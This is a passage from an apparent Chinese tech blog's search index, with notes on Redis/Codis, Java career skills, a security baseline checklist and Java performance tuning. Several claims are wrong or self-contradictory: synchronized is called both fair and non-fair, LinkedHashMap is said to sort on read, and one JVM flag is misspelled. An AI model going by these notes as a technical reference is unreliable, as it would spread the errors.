的优势：</p><ul><li>对客户端透明,与codis交互方式和redis本身交互一样</li><li>支持在线数据迁移,迁移过程对客户端透明有简单的管理和监控界面</li><li>支持高可用,无论是redis数据存储还是代理节点</li><li>自动进行数据的均衡分配</li><li>最大支持1024个redis实例,存储容量海量</li><li>高性能</li></ul><p>使用了 codis 带来的限制：</p><ul><li>最大支持1024个redis实例 （redis cluster支持的槽位更多）</li><li>采用自有的redis分支,不能与原版的redis保持同步</li><li>某些命令不支持,比如事务命令、muti</li><li>redis 实例和单机相比下降 20% </li><li>国内开源产品,活跃度相对弱一些</li></ul><h4 id="数据指标"><a href="#数据指标" class="headerlink" title="数据指标"></a>数据指标</h4><p>官方数据表示Redis读的速度是110000次/s,写的速度是81000次/s 。</p><h3 id="大厂案例"><a href="#大厂案例" class="headerlink" title="大厂案例"></a>大厂案例</h3><h4 id="知乎-redis-优化情况"><a href="#知乎-redis-优化情况" class="headerlink" title="知乎 redis 优化情况"></a>知乎 redis 优化情况</h4><p>目前，Redis 在知乎的应用规模如下：</p><p>1）机器内存总量约 70TB，实际使用内存约 40TB；</p><p>2）平均每秒处理约 1500 万次请求，峰值每秒约 2000 万次请求；</p><p>3）每天处理约 1 万亿余次请求；</p><p>4）单集群每秒处理最高每秒约 400 万次请求；</p><p>5）集群实例与单机实例总共约 800 个；</p><p>6）实际运行约 16000 个 Redis 实例；</p><p>7）Redis 使用官方 3.0.7 版本，少部分实例采用 4.0.11 版本。</p><p>采用的是 Twemproxy 集群方案。</p><p><img src="/性能优化/performance/redis-performance/1500839-504df1bcc0e9cda3.jpg" alt="img"></p><h3 id="redis-常用工具"><a href="#redis-常用工具" class="headerlink" title="redis 常用工具"></a>redis 常用工具</h3><h4 id="redis-测试性能测试"><a href="#redis-测试性能测试" class="headerlink" title="redis 测试性能测试"></a>redis 测试性能测试</h4><p>用于性能测试</p><blockquote><p>./redis-benchmark -h 127.0.0.1 -p 6379 -d 1000 -c 100 -n 100000</p></blockquote><h4 id="redis-monitor"><a href="#redis-monitor" class="headerlink" title="redis monitor"></a>redis monitor</h4><p>用于redis 运行情况的监控</p><blockquote><p>redis 127.0.0.1:6379&gt; MONITOR </p></blockquote><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.cnblogs.com/imstudy/p/9668257.html" target="_blank" rel="noopener">https://www.cnblogs.com/imstudy/p/9668257.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 性能优化 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java web 方向技术核心</title>
      <link href="/%E9%9D%A2%E8%AF%95/interview/java-web-skill/"/>
      <url>/%E9%9D%A2%E8%AF%95/interview/java-web-skill/</url>
      
        <content type="html"><![CDATA[<p>职场上，技术应该像一个同心圆一样，核心的部分代表你有没有饭吃，周围的东西代表了你能比别人做的好。首先要保证核心技能，再拓展周围技能。对程序员来说，核心技术就是编程语言、数据库、linux等，周边技能像管理、英语、沟通等属于加分项。</p><p>如果你定位是 Java 程序员，那么知识结构应该如下：</p><table><thead><tr><th></th><th>技能点</th><th>学习材料</th><th>验收</th></tr></thead><tbody><tr><td>Nice to have</td><td>英语<br><br>团队管理<br>技术架构<br><br>性能优化<br><br>Devops<br>DDD<br>UML<br>JVM 调优</td><td></td><td>能做到 TL ，并能承担海外项目主要能力</td></tr><tr><td>Java 应用层</td><td>Java <br>linux<br>spring boot<br>MySQL<br>Redis<br>RocketMQ</td><td></td><td>成为合格的 Java developer<br>能完成：<br>日常开发<br>DEBUG<br>总结这些技术的脚手架<br>对源码有一定了解</td></tr><tr><td>计算机科学层</td><td>计算机网络<br>数据结构<br>算法<br>操作系统<br>网络协议</td><td></td><td>内功，熟悉各种：<br>网络协议<br>基本算法<br>操作系统结构<br>数据库原理<br></td></tr></tbody></table><p>学习的过程应该是一个 PDCA 闭环，计划、学习、检查、处理形成一个闭环。</p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>值得学习的一些博客</title>
      <link href="/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/well-blogs/"/>
      <url>/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/well-blogs/</url>
      
        <content type="html"><![CDATA[<h2 id="博客收集"><a href="#博客收集" class="headerlink" title="博客收集"></a>博客收集</h2><p>- </p>]]></content>
      
      
      <categories>
          
          <category> 职业素质 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title></title>
      <link href="/uncategorized/redis/distributed-lock/"/>
      <url>/uncategorized/redis/distributed-lock/</url>
      
        <content type="html"><![CDATA[<p>title: Redis 实现分布式锁<br>categories: Redis<br>toc: true</p><p>## </p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>安全红线参考</title>
      <link href="/%E5%AE%89%E5%85%A8/security/red-line/"/>
      <url>/%E5%AE%89%E5%85%A8/security/red-line/</url>
      
        <content type="html"><![CDATA[<h2 id="网络安全"><a href="#网络安全" class="headerlink" title="网络安全"></a>网络安全</h2><h3 id="安全通道"><a href="#安全通道" class="headerlink" title="安全通道"></a>安全通道</h3><ol><li>用户测不允许直接连接到管理系统</li><li>无任何隐藏通道</li><li>关闭高危端口</li></ol><h3 id="网络协议"><a href="#网络协议" class="headerlink" title="网络协议"></a>网络协议</h3><ol><li>所有的网络端口都是业务必须的，动态监听的端口都应该被关闭</li><li>所有的网络连接都需要有认证机制</li></ol><h3 id="web-安全"><a href="#web-安全" class="headerlink" title="web 安全"></a>web 安全</h3><ol><li>每一个需要用户授权的网络请求，都需要鉴权。必须核实用户的会话标识是否合法。</li><li>对用户的最终认证必须发生在服务器端。</li><li>服务器对所有来自不可信数据源的数据进行校验（注入攻击），拒绝任何没通过校验的数据。若输出到客户端的数据来自不可信的数据源，都必须进行编码和转义（XSS攻击）。</li><li>必须使用 web 安全扫描软件对容器和应用进行安全扫描，并解决高风险的漏洞。</li><li>Session ID必须具有随机性、唯一性，身份验证成功后需要更换 Session ID。</li><li>文件上传需要对类型进行验证，应当正确使用 MIME 检查。</li></ol><h3 id="数据库安全"><a href="#数据库安全" class="headerlink" title="数据库安全"></a>数据库安全</h3><ol><li>禁止使用默认口令</li><li>用户应该具有最小权限，不允许使用超级用户访问所有的数据库</li><li>如果存在多个默认账号，应该禁用无用的账号</li></ol><h3 id="编码安全"><a href="#编码安全" class="headerlink" title="编码安全"></a>编码安全</h3><ol><li>数据库等凭据不允许明文存储在应用程序中</li><li>非信任的网络传输应该使用 HTTPS</li><li>系统中对接必须使用公有账号</li><li>禁止使用私有加密算法</li></ol><h2 id="口令策略"><a href="#口令策略" class="headerlink" title="口令策略"></a>口令策略</h2><h3 id="口令复杂度"><a href="#口令复杂度" class="headerlink" title="口令复杂度"></a>口令复杂度</h3><ol><li>口令至少5个字符</li><li>口令包含如下规则<ol><li>至少一个小写字母</li><li>至少一个大写字母</li><li>至少一个数字</li><li>至少一个特殊字符</li></ol></li><li>口令不能和账号一样</li><li>口令不能被重复使用</li><li>*例外情况不要求强制复杂度<ol><li>输入受限，例如无法使用3完整的键盘</li><li>业界习惯，例如手机 PIN 码</li></ol></li></ol><h3 id="防暴力破解机制"><a href="#防暴力破解机制" class="headerlink" title="防暴力破解机制"></a>防暴力破解机制</h3><p>超过一定阈值（例如5次尝试）启动防暴力破解机制：</p><ol><li>锁定账号</li><li>锁定IP</li><li>登录延迟</li><li>验证码识别</li><li>白名单</li></ol><h3 id="口令安全规则"><a href="#口令安全规则" class="headerlink" title="口令安全规则"></a>口令安全规则</h3><ol><li>口令禁止回显</li><li>输入框不允许拷贝</li><li>缺省密码符合复杂度要求</li><li>用户修改自己口令必须验证旧口令或者 OTP 验证</li></ol>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>性能优化</title>
      <link href="/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/performance/performance-overview/"/>
      <url>/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/performance/performance-overview/</url>
      
        <content type="html"><![CDATA[<h2 id="性能优化的维度"><a href="#性能优化的维度" class="headerlink" title="性能优化的维度"></a>性能优化的维度</h2><ul><li>程序设计优化 </li><li>Java 代码调优</li><li>JVM 调优</li><li>数据库调优</li><li>操作系统调优</li></ul><h2 id="基准测试"><a href="#基准测试" class="headerlink" title="基准测试"></a>基准测试</h2><ul><li>JMH Java 性能测试</li><li>数据性能测试</li></ul><h3 id="常用指标和计算公式"><a href="#常用指标和计算公式" class="headerlink" title="常用指标和计算公式"></a>常用指标和计算公式</h3><h4 id="QPS-计算公式"><a href="#QPS-计算公式" class="headerlink" title="QPS 计算公式"></a>QPS 计算公式</h4><blockquote><p>QPS = (1 / t ) * n</p></blockquote><p>一秒内可以处理的请求数量称之为服务器的QPS。</p><p>上面我们计算了10000个请求的耗时，那么反过来计算每秒处理多少请求则</p><p>如果一次性可以处理100个请求，每个请求耗时100毫秒，则qps = 1000</p><p>如果一次性可以处理50个请求，每个请求耗时200毫秒，则qps = 250</p><h2 id="程序设计优化"><a href="#程序设计优化" class="headerlink" title="程序设计优化"></a>程序设计优化</h2><h3 id="缓冲技术"><a href="#缓冲技术" class="headerlink" title="缓冲技术"></a>缓冲技术</h3><p>缓冲技术用于协调不同系统之间的性能差异。例如文件流写入磁盘的速度慢，程序就会阻塞，缓冲像一个漏斗，先存放到内存，应用程序可以完成操作，缓冲慢慢释放内容到文件。缓冲可以大幅度提高 IO 效率。</p><h4 id="BufferedWriter"><a href="#BufferedWriter" class="headerlink" title="BufferedWriter"></a>BufferedWriter</h4><p>用于包装 writer，构造函数的第二个参数可以指定缓冲区大小，默认为 8K。</p><pre><code class="java">BufferedWriter bw = new BufferedWriter(new FileWriter(new File(&quot;test.txt&quot;))) ;bw.write(&quot;hello&quot;);bw.write(&quot;world&quot;);bw.flush();bw.close();</code></pre><h4 id="BufferedOutputStream"><a href="#BufferedOutputStream" class="headerlink" title="BufferedOutputStream"></a>BufferedOutputStream</h4><p>用于包装输出流，构造函数的第二个参数可以指定缓冲区大小，默认为 8K。</p><pre><code class="java">FileOutputStream fos=new FileOutputStream(&quot;test.txt&quot;);BufferedOutputStream bos=new BufferedOutputStream(fos);String content=&quot;hello world！&quot;;bos.write(content.getBytes(),0,content.getBytes().length);bos.flush();bos.close();</code></pre><h3 id="缓存技术"><a href="#缓存技术" class="headerlink" title="缓存技术"></a>缓存技术</h3><p>不一定是所有从数据库读出的数据才需要缓存，很多数据都可以被缓存，例如网络请求、复杂计算，这些数据可以被零时缓存到内存中。</p><h4 id="EhCache-进程内缓存"><a href="#EhCache-进程内缓存" class="headerlink" title="EhCache 进程内缓存"></a>EhCache 进程内缓存</h4><p>mybatis、shiro、hibernate 中的一级缓存都是 EhCache。默认内存缓存，可以配置为磁盘、外部介质。</p><p>远程 API 操作</p><pre><code>// 1. 创建缓存管理器CacheManager cacheManager = CacheManager.create(&quot;./src/main/resources/ehcache.xml&quot;);// 2. 获取缓存对象Cache cache = cacheManager.getCache(&quot;HelloWorldCache&quot;);// 3. 创建元素Element element = new Element(&quot;key1&quot;, &quot;value1&quot;);// 4. 将元素添加到缓存cache.put(element);// 5. 获取缓存Element value = cache.get(&quot;key1&quot;);System.out.println(value);System.out.println(value.getObjectValue());// 6. 删除元素cache.remove(&quot;key1&quot;);</code></pre><h5 id="使用Spring-注解操作"><a href="#使用Spring-注解操作" class="headerlink" title="使用Spring 注解操作"></a>使用Spring 注解操作</h5><p><strong>@Cacheable</strong>  </p><p>修饰的方法执行后就将返回值放入缓存，不再执行。表明所修饰的方法是可以缓存的，这个注解可以用condition属性来设置条件</p><pre><code class="java">@Cacheable(value=&quot;UserCache&quot;, key=&quot;&#39;user:&#39; + #userId&quot;)    public User findById(String userId) {        return (User) new User(&quot;1&quot;, &quot;mengdee&quot;);           }    </code></pre><p><strong>@CacheEvict</strong></p><p>和 Cacheable 相反，执行后根据规则清空缓存。</p><pre><code class="java">@CacheEvict(value=&quot;UserCache&quot;,key=&quot;&#39;user:&#39; + #userId&quot;)    public void removeUser(User user) {        System.out.println(&quot;UserCache&quot;+user.getUserId());    }    </code></pre><h3 id="池化技术"><a href="#池化技术" class="headerlink" title="池化技术"></a>池化技术</h3><h4 id="对象池"><a href="#对象池" class="headerlink" title="对象池"></a>对象池</h4><p>java中的对象池技术，是为了方便快捷地创建某些对象而出现的，当需要一个对象时，就可以从池中取一个出来（如果池中没有则创建一个），则在需要重复重复创建相等变量时节省了很多时间。</p><p>Java 中数据类型的包装类型支持基本的对象池技术。</p><h4 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h4><p>多线程可以充分利用多核 CPU 的使用率。使用线程池可以大幅度提高多线程性能，下面是一个线程池的例子，推荐使用 Executors 创建线程：</p><pre><code class="java">ExecutorService executor = Executors.newFixedThreadPool(10);executor.execute(new MyThread());executor.shutdown;</code></pre><p>线程池的数量非常重要，《Java 并发编程实践》中给出了一个公式</p><ul><li><p>Ncpu = CPU 的数量</p></li><li><p>Ucpu = 目标 CPU 的使用率</p></li><li><p>W/C = 等待时间与计算时间的比率</p></li><li><p>Nthreads  = 合理的线程数量 </p></li></ul><blockquote><p> Nthreads = Ncpu <em> Ucpu </em> (1 + W/C)</p></blockquote><h4 id="连接池"><a href="#连接池" class="headerlink" title="连接池"></a>连接池</h4><p>数据库连接池使用 C3P0、DBCP、HikariCP和Druid，spring 推荐使用 DBCP，但是 Druid 支持监控，可以对慢 SQL 进行分析。</p><h2 id="Java-代码调优"><a href="#Java-代码调优" class="headerlink" title="Java 代码调优"></a>Java 代码调优</h2><h3 id="字符串优化"><a href="#字符串优化" class="headerlink" title="字符串优化"></a>字符串优化</h3><h4 id="优先使用字面量，而不是-new-String"><a href="#优先使用字面量，而不是-new-String" class="headerlink" title="优先使用字面量，而不是 new String();"></a>优先使用字面量，而不是 new String();</h4><pre><code>String str = &quot;&quot;;// 优于String str1 = new String();</code></pre><h4 id="优先使用-StringTokenizer-分隔字符串"><a href="#优先使用-StringTokenizer-分隔字符串" class="headerlink" title="优先使用 StringTokenizer 分隔字符串"></a>优先使用 StringTokenizer 分隔字符串</h4><h4 id="只用-charAt-进行字符串比较"><a href="#只用-charAt-进行字符串比较" class="headerlink" title="只用 charAt 进行字符串比较"></a>只用 charAt 进行字符串比较</h4><h4 id="优先使用-StringBuilder-和-StringBuffer"><a href="#优先使用-StringBuilder-和-StringBuffer" class="headerlink" title="优先使用 StringBuilder 和 StringBuffer"></a>优先使用 StringBuilder 和 StringBuffer</h4><h3 id="合理选用数据结构"><a href="#合理选用数据结构" class="headerlink" title="合理选用数据结构"></a>合理选用数据结构</h3><h4 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h4><p>ArrayList 通过数组实现，每次扩容会造成大量的性能消耗，适合读多写少的操作，注意设置初始数组大小。</p><p>LinkedList 通过双向链表实现，查询效率低，写入速度快，适合写多读少。</p><p>Vector ArrayList 的线程安全实现，性能相差无几, 适合写多读少的场景。</p><p>CopyOnWriteArray 通过 COW 技术实现线程安全的实现，适合读多写少操作。</p><h4 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h4><p>HashMap 注意设置负载因子降低冲突</p><p>LinkedHaspMap 在读取时排序，内部基于链表，适合写多读少</p><p>TreeMap 实现了 sortedMap 满足对有序性的需求，在写入时排序，内部基于红黑树，适合读多写少</p><p>ConcurrentHashMap 是线程安全且高性能的额 Map 容器，使用了 CAS、红黑树、分段锁等技术。</p><h4 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h4><p>满足 Map 的无重复性需求</p><p>HashSet，对应 HashMap，基于hash的快速插入</p><p>LinkedHashSet，对应 LinkedHashMap，基于 hash 的插入，维护了插入集合的先后顺序个。按照先进先出的顺序排序</p><p>TreeSet，对应 Tree Map 基于红黑树的实现。有高效的元素 key 的排序算法</p><h4 id="RandomAccess-随机访问接口"><a href="#RandomAccess-随机访问接口" class="headerlink" title="RandomAccess 随机访问接口"></a>RandomAccess 随机访问接口</h4><p>用于标记是是否支持随机访问，提高代码性能：</p><pre><code>if(list isntanceof RandomAccess){    // 随机访问}else{    // 老老实实使用迭代器 }</code></pre><h3 id="使用-NIO"><a href="#使用-NIO" class="headerlink" title="使用 NIO"></a>使用 NIO</h3><p>TODO </p><h3 id="合理使用引用类型"><a href="#合理使用引用类型" class="headerlink" title="合理使用引用类型"></a>合理使用引用类型</h3><h4 id="强引用"><a href="#强引用" class="headerlink" title="强引用"></a>强引用</h4><p>Java默认的引用方式，存在引用的情况下可以不会被回收。</p><h4 id="软引用"><a href="#软引用" class="headerlink" title="软引用"></a>软引用</h4><p>通过 SoftReference 使用软引用，当 内存达到一定阈值，GC会回收。</p><h3 id="弱引用"><a href="#弱引用" class="headerlink" title="弱引用"></a>弱引用</h3><p>GC 运行时会被回收，但是 GC 不会随时运行，因此可以利用这个特性实现某些缓存机制。</p><p>某些数据（缓存）放到一个超大的 map中会造成内存泄露，因此可以使用 WeakHashMap 来自动释放。</p><h4 id="虚引用"><a href="#虚引用" class="headerlink" title="虚引用"></a>虚引用</h4><p>深入理解JAVA虚拟机一书中有这样一句描述：<strong>“为一个对象设置虚引用关联的唯一目的就是能在这个对象被收集器回收时收到一个系统通知”。</strong></p><p>虚引用更多的是用于对象回收的监听。</p><ol><li>重要对象回收监听 进行日志统计</li><li>系统gc监听 因为虚引用每次GC都会被回收，那么我们就可以通过虚引用来判断gc的频率，如果频率过大，内存使用可能存在问题，才导致了系统gc频繁调用</li></ol><h3 id="其他技巧"><a href="#其他技巧" class="headerlink" title="其他技巧"></a>其他技巧</h3><h4 id="少使用异常"><a href="#少使用异常" class="headerlink" title="少使用异常"></a>少使用异常</h4><h4 id="使用局部变量"><a href="#使用局部变量" class="headerlink" title="使用局部变量"></a>使用局部变量</h4><p>局部变量在栈中，类变量在堆中。</p><h4 id="使用位运算"><a href="#使用位运算" class="headerlink" title="使用位运算"></a>使用位运算</h4><p>使用移位运算代替乘法除法（计算机实现原理）</p><h4 id="替换-switch"><a href="#替换-switch" class="headerlink" title="替换 switch"></a>替换 switch</h4><h4 id="一维数组代替二维数组"><a href="#一维数组代替二维数组" class="headerlink" title="一维数组代替二维数组"></a>一维数组代替二维数组</h4><h4 id="使用-arrayCopy"><a href="#使用-arrayCopy" class="headerlink" title="使用 arrayCopy"></a>使用 arrayCopy</h4><h4 id="使用-Buffer-对-IO进行包装"><a href="#使用-Buffer-对-IO进行包装" class="headerlink" title="使用 Buffer 对 IO进行包装"></a>使用 Buffer 对 IO进行包装</h4><h4 id="使用-clone-代替new"><a href="#使用-clone-代替new" class="headerlink" title="使用 clone() 代替new"></a>使用 clone() 代替new</h4><p>clone 会绕过构造函数</p><h4 id="静态方法代替实例方法"><a href="#静态方法代替实例方法" class="headerlink" title="静态方法代替实例方法"></a>静态方法代替实例方法</h4><h2 id="并发调优"><a href="#并发调优" class="headerlink" title="并发调优"></a>并发调优</h2><h3 id="并发基础"><a href="#并发基础" class="headerlink" title="并发基础"></a>并发基础</h3><h4 id="volatile"><a href="#volatile" class="headerlink" title="volatile"></a>volatile</h4><p>线程会对变量局部更新，提高性能。volatile 变量可见性保证，这是并发编程的基础</p><ul><li>其他线程对变量的修改，理解反应到当前线程中</li><li>确保当前线程对 volatile 的修改，能即时写回共享主内存中，并被其他线程所见</li><li>使用 volatile 声明的变量，编译器会保证有序性</li></ul><h4 id="同步关键字-synchronized"><a href="#同步关键字-synchronized" class="headerlink" title="同步关键字 synchronized"></a>同步关键字 synchronized</h4><p>Java 中最基本的锁机制，可以锁方法、变量、类、静态方法等资源， synchronized 为公平锁。</p><h4 id="线程局部变量-ThreadLocal"><a href="#线程局部变量-ThreadLocal" class="headerlink" title="线程局部变量 ThreadLocal"></a>线程局部变量 ThreadLocal</h4><p>线程执行时独立的内存空间，在某些业务场景下可以用来实现并发操作，避免锁的使用。</p><h4 id="信号量-Semaphore"><a href="#信号量-Semaphore" class="headerlink" title="信号量 Semaphore"></a>信号量 Semaphore</h4><p>锁是对单个资源的控制，型号量可以对一组资源管理，例如 100 个线程的线程池，可以定义一个型号量 100，当型号量小于 100 时，请求才允许被加入。</p><h3 id="锁优化"><a href="#锁优化" class="headerlink" title="锁优化"></a>锁优化</h3><h4 id="锁的分类"><a href="#锁的分类" class="headerlink" title="锁的分类"></a>锁的分类</h4><ul><li>乐观锁/悲观锁<ul><li>乐观锁：就是很乐观，每次去拿数据的时候都认为别人不会修改，所以不会上锁，但是在更新的时候会判断一下在此期间别人有没有去更新这个数据。典型的是使用版本号更新前判断。<code>update xxx when version =xxx;</code>如果版本号不匹配更新失败。在Java中 CAS 就是乐观锁。</li><li>悲观锁：总是假设最坏的情况，每次去拿数据的时候都认为别人会修改，所以每次在拿数据的时候都会上锁。synchronized 就是悲观锁，mysql 中就是 readForUpdate 语句。</li></ul></li><li>独享锁/共享锁<ul><li>独享锁是指该锁一次只能被一个线程所持有，例如 Synchronize、ReentrantLock。</li><li>共享锁是指该锁可被多个线程所持有。</li></ul></li><li>互斥锁/读写锁<ul><li>互斥锁在Java中的具体实现就是ReentrantLock。</li><li>读写锁在Java中的具体实现就是ReadWriteLock、ReentrantReadWriteLock</li></ul></li><li>可重入锁<ul><li>上锁后每个访问的线程都需要排队，可重入的意思是已经获取锁的线程再次进入无需排队，避免死锁。可重入锁又名递归锁，是指在同一个线程在外层方法获取锁的时候，在进入内层方法会自动获取锁。</li></ul></li><li>公平锁/非公平锁<ul><li>公平锁是指多个线程按照申请锁的顺序来获取锁。ReetrantLock而言，通过构造函数指定该锁是否是公平锁，默认是非公平锁。</li><li>非公平锁是指多个线程获取锁的顺序并不是按照申请锁的顺序，按照CPU运行时间片来划分的。ReetrantLock而言，通过构造函数指定该锁是否是公平锁，默认是非公平锁。Synchronized 也是一种非公平锁，无法变成公平锁。</li></ul></li><li>分段锁<ul><li>分段锁其实是一种锁的设计，并不是具体的一种锁。ConcurrentHashMap而言，其并发的实现就是通过分段锁的形式来实现高效的并发操作。ConcurrentHashMap中的分段锁称为Segment，它即类似于HashMap（JDK7和JDK8中HashMap的实现）的结构，即内部拥有一个Entry数组，数组中的每个元素又是一个链表。当需要put元素的时候，并不是对整个hashmap进行加锁，而是先通过hashcode来知道他要放在哪一个分段中，然后对这个分段进行加锁，所以当多线程put的时候，只要不是放在一个分段中，就实现了真正的并行的插入。统计 Size 的时候需要全局加锁才能统计</li></ul></li><li>偏向锁/轻量级锁/重量级锁<ul><li>这三种锁是指锁的状态，并且是针对Synchronized。</li><li>偏向锁是指一段同步代码一直被一个线程所访问，那么该线程会自动获取锁。</li><li>轻量级锁是指当锁是偏向锁的时候，被另一个线程所访问，偏向锁就会升级为轻量级锁，其他线程会通过自旋的形式尝试获取锁，不会阻塞。</li><li>重量级锁是指当锁为轻量级锁的时候，另一个线程虽然是自旋，但自旋不会一直持续下去，当自旋一定次数的时候，还没有获取到锁，就会进入阻塞，该锁膨胀为重量级锁。</li></ul></li><li>自旋锁<ul><li>在Java中，自旋锁是指尝试获取锁的线程不会立即阻塞，而是采用循环的方式去尝试获取锁，这样的好处是减少线程上下文切换的消耗，缺点是循环会消耗CPU。</li></ul></li></ul><h4 id="AQS-技术"><a href="#AQS-技术" class="headerlink" title="AQS 技术"></a>AQS 技术</h4><p>AbstractQueuedSynchronized 抽象队列式的同步器，AQS定义了一套多线程访问共享资源的同步器框架，许多同步类实现都依赖于它，如常用的ReentrantLock/Semaphore/CountDownLatch</p><p><img src="/性能优化/performance/performance-overview/721070-20170504110246211-10684485.png" alt="img"></p><p>想要获取锁的线程通过 CAS 设置资源计数器，当资源计数器为0时，队列开始移动，否则进行排队操作。</p><h4 id="避免死锁"><a href="#避免死锁" class="headerlink" title="避免死锁"></a>避免死锁</h4><p>死锁会造成线程挂起彼此等待，死锁可以 dump 出栈空间即可分析。</p><p>死锁产生的必要条件：</p><ol><li>互斥条件：一个资源每次只能被一个进程使用</li><li>请求与保持条件：一个进程因请求资源被阻塞，对已经获得的资源保持不放</li><li>不剥夺条件：进程获得的资源，在未使用完之前，不能强行剥夺</li><li>循环等待等待条件：若干进程之间形成了一个等待资源的循环</li></ol><p>常见的死锁就是分布式锁和数据库锁之间的的矛盾。</p><p>例如 数据库某行记录 A，某个变量 B，两个线程分别获得了锁，然后互相等待对方释放。</p><h4 id="减少锁持有时间和颗粒度"><a href="#减少锁持有时间和颗粒度" class="headerlink" title="减少锁持有时间和颗粒度"></a>减少锁持有时间和颗粒度</h4><p>当锁不可避免时，应该减少锁的持有时间和颗粒度。</p><ul><li>synchronized 只锁变量不要锁类，注意 self  和 this的区别</li><li>数据库锁行，而不要锁表</li><li>使用分段锁减少锁的颗粒度</li></ul><h4 id="使用读写分离锁来替换独占锁"><a href="#使用读写分离锁来替换独占锁" class="headerlink" title="使用读写分离锁来替换独占锁"></a>使用读写分离锁来替换独占锁</h4><p>读一般无需上锁，因此不应该将所有的请求都上锁，只对写上锁即可。</p><h4 id="锁分离思想"><a href="#锁分离思想" class="headerlink" title="锁分离思想"></a>锁分离思想</h4><p>根据读写分离锁的思想，更新、删除或其他操作都可以分别上锁，而不是一个大锁。</p><p>例如 LinkedblockingQueue 基于链表，那么 take 和 put 操作可以分开上锁，减少锁竞争。</p><h4 id="合理使用重入锁和内部锁-（synchronized）"><a href="#合理使用重入锁和内部锁-（synchronized）" class="headerlink" title="合理使用重入锁和内部锁 （synchronized）"></a>合理使用重入锁和内部锁 （synchronized）</h4><p>优先使用内部锁，减少编程复杂度，需要时再使用 ReentrantLock</p><h4 id="锁粗化-（Lock-Coarsening）"><a href="#锁粗化-（Lock-Coarsening）" class="headerlink" title="锁粗化 （Lock Coarsening）"></a>锁粗化 （Lock Coarsening）</h4><p>锁粗化是相对于锁细粒度的另外一个极端情况的，当锁粒度过于细，反复获取锁也是不对的，应该保持适度。</p><p>在循环体中不应该使用锁，而是应该在循环体外使用锁，否则锁会反复被获取和释放。</p><h4 id="开启-JVM-锁自璇"><a href="#开启-JVM-锁自璇" class="headerlink" title="开启 JVM 锁自璇"></a>开启 JVM 锁自璇</h4><p>如果一个锁反复没有获取，线程切换的成本很高，还不如让它执行空循环（自旋）。</p><blockquote><p>=XX:+UseSpinning </p></blockquote><p>开启自旋</p><h4 id="开启-JVM-自动锁消除"><a href="#开启-JVM-自动锁消除" class="headerlink" title="开启 JVM 自动锁消除"></a>开启 JVM 自动锁消除</h4><p>有一些程序不必要使用锁，例如局部变量，JVM 可以优化为开启自旋锁。</p><blockquote><p>-server -XX:+DoEsccapeAnalysis -XX:+EliminateLocks </p></blockquote><p>开启逃逸分析和锁消除。</p><h4 id="开启锁偏向"><a href="#开启锁偏向" class="headerlink" title="开启锁偏向"></a>开启锁偏向</h4><p>如果没有发生竞争就进入锁偏向模式，关闭同步操作，用于优化不激烈的锁场景，这个优化场景意义不大。</p><blockquote><p>-XX:+UseBiasedLocking </p></blockquote><h3 id="无锁并行计算设计"><a href="#无锁并行计算设计" class="headerlink" title="无锁并行计算设计"></a>无锁并行计算设计</h3><p>无锁的算法实际上就是一些乐观锁 CAS、COW等。</p><h4 id="原子操作"><a href="#原子操作" class="headerlink" title="原子操作"></a>原子操作</h4><p>在 atomic 包下有一些原子操作类，大量使用 CAS 技术，非常有用。</p><p>例如 AtomicInteger.addAndGet() 通过一个无穷循环 CAS 直到成功。</p><h4 id="Amino-框架"><a href="#Amino-框架" class="headerlink" title="Amino 框架"></a>Amino 框架</h4><p>提供了一些成熟的无锁数据结构。</p><h2 id="JVM-调优"><a href="#JVM-调优" class="headerlink" title="JVM 调优"></a>JVM 调优</h2><p>JVM 输出调试信息</p><blockquote><p>-XX:+PrintGCDetails</p></blockquote><h3 id="虚拟机内存模型"><a href="#虚拟机内存模型" class="headerlink" title="虚拟机内存模型"></a>虚拟机内存模型</h3><p>JVM 虚拟机模型</p><p><img src="/性能优化/performance/performance-overview/format,png.png" alt="img"></p><p>堆内存模型</p><p><img src="/性能优化/performance/performance-overview/70.png" alt="img"></p><h4 id="程序计数器"><a href="#程序计数器" class="headerlink" title="程序计数器"></a>程序计数器</h4><h4 id="虚拟机栈"><a href="#虚拟机栈" class="headerlink" title="虚拟机栈"></a>虚拟机栈</h4><p>栈的大小决定了函数调用可达的深度，-Xss 设置栈的大小，一般无需设置此参数，应该消除递归代码</p><p>一般设置为 -Xss1M</p><p>另外，函数嵌套调用次数由栈的大小决定。栈越大，函数的嵌套调用次数越多。对一个函数而言，它的参数越多，内部局部变量越多，栈帧就越大，嵌套调用次数就会减少。</p><h4 id="本地方栈"><a href="#本地方栈" class="headerlink" title="本地方栈"></a>本地方栈</h4><p>本地方法栈为 java 原生函数调用使用的空间。</p><h4 id="Java-堆"><a href="#Java-堆" class="headerlink" title="Java 堆"></a>Java 堆</h4><p>Java 堆为Java对象存储位置。采用分代内存回收策略：</p><ul><li>新生代<ul><li>eden 伊利园</li><li>s0 survior</li><li>s1 survior</li></ul></li><li>老年代</li></ul><p>使用 -XX 参数设置</p><h4 id="方法区"><a href="#方法区" class="headerlink" title="方法区"></a>方法区</h4><p>方法去也可称为永久区，主要存放常量和类的定义信息。</p><h3 id="JVM-内存分配参数"><a href="#JVM-内存分配参数" class="headerlink" title="JVM 内存分配参数"></a>JVM 内存分配参数</h3><h4 id="设置最大堆内存"><a href="#设置最大堆内存" class="headerlink" title="设置最大堆内存"></a>设置最大堆内存</h4><blockquote><p>-Xmx </p></blockquote><p>默认为物理内存的四分之一，一般可以开启到物理内存一致。</p><h4 id="设置最小堆内存"><a href="#设置最小堆内存" class="headerlink" 